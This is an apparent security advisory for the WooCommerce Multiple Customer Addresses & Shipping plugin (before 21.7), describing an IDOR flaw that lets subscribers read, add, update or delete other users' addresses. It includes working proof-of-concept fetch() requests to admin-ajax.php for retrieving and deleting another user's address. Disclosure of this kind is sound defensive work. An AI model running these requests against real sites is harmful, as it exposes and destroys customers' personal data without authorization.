## WordPress Plugin Vulnerabilities

# WooCommerce Multiple Customer Addresses & Shipping < 21.7 - Arbitrary Address Creation/Deletion/Access/Update via IDOR

### Description

The plugin does not ensure that the address to add/update/retrieve/delete and duplicate belong to the user making the request, or is from a high privilege users, allowing any authenticated users, such as subscriber to add/update/duplicate/delete as well as retrieve addresses of other users.

### Proof of Concept

Run the below commands in the developer console of the web browser while being on the blog as subscriber user (note: the address manipulated are those added via the plugin, not WC)
To retrieve the first address of the user with ID 1750
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": 'action=wcmca\_get\_address\_by\_id&address\_id=0&user\_id=1750',
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
Other possible values for address\_id: last\_used\_billing, last\_used\_shipping, checkout\_data.
To delete the address with ID 1 of the user with ID 1750 (to be executed on the Edit Address page when logged as a subscriber, e.g http://example.com/my-account/edit-address/)
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": 'action=wcmca\_delete\_address&wcmca\_delete\_id=0&wcmca\_user\_id=1&wcmca\_security\_token=' + wcmca\_address\_form['security\_token'],
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
It is also possible to add/update an address of an arbitrary user via the wcmca\_save\_new\_address AJAX action.
